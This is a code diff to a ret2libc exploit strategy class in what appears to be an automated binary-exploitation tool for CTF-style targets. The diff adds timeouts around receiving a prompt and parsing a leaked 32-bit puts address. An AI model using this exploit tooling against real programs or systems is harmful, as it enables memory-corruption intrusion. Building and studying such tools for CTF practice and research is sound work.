@@ -104,13 +104,24 @@ class Ret2LibcPutX32LocalStrategy(ExploitStrategy):
             return False
 
         io = process(str(ctx.binary.path))
-        io.recv()
+        # v4.0.2c1: ``io.recv()`` with no count blocks until EOF,
+        # but the target binary may not print a prompt first (e.g.
+        # fmtstr1 immediately reads input).  Cap the wait at 0.5s
+        # and discard the (possibly empty) initial banner.
+        try:
+            io.recv(timeout=0.5)
+        except Exception:
+            pass
         io.sendline(payload1)
         print_payload("sending puts leak payload")
 
         # Parse the leak: 4 bytes ending in 0xf7.
+        # v4.0.2c1: add timeout=2 to prevent indefinite hang when
+        # binary doesn't produce the expected leak (e.g. fmtstr1 has
+        # canary protection + no stack overflow → puts leak never
+        # arrives → recvuntil blocks forever).
         try:
-            puts_addr = u32(io.recvuntil(b"\xf7")[-4:])
+            puts_addr = u32(io.recvuntil(b"\xf7", timeout=2)[-4:])
         except Exception as e:
             print_info(f"ret2libc-put-x32 leak parse failed: {e}")
             return False
